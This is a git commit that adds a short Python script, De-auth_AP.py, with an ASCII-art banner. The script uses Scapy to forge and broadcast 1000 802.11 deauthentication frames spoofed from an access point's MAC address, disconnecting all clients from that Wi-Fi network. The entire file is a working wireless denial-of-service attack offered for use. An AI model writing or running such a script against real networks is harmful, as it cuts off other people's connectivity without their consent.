131f3931a3ddc943717b2234c8c0e875570f1572
Omar_Ahmed <mistspark@gmail.com>
2017-09-08 05:26:14 +0300

    Create De-auth_AP.py

---
+++ Wireless/De-auth_AP.py
@@ -0,0 +1,26 @@
+#!/usr/bin/env python
+
+'''
+   *                  (
+ (  `               ) )\ )                      ) 
+ )\))(   (       ( /((()/(           )  (    ( /( 
+((_)()\  )\  (   )\())/(_))`  )   ( /(  )(   )\())
+(_()((_)((_) )\ (_))/(_))  /(/(   )(_))(()\ ((_)\ 
+|  \/  | (_)((_)| |_ / __|((_)_\ ((_)_  ((_)| |(_)
+| |\/| | | |(_-<|  _|\__ \| '_ \)/ _` || '_|| / / 
+|_|  |_| |_|/__/ \__||___/| .__/ \__,_||_|  |_\_\ 
+                          |_|
+'''
+
+import sys
+from scapy.all import *
+
+interface = "wlan2"
+
+BSSID = raw_input("Enter the MAC of AP: ")
+vic = "FF:FF:FF:FF:FF:FF"
+
+frame = RadioTap()/Dot11(addr1=vic, addr2=BSSID, addr3=BSSID)/Dot11Deauth()
+
+sendp(frame, iface=interface, count=1000, inter= .1)
+
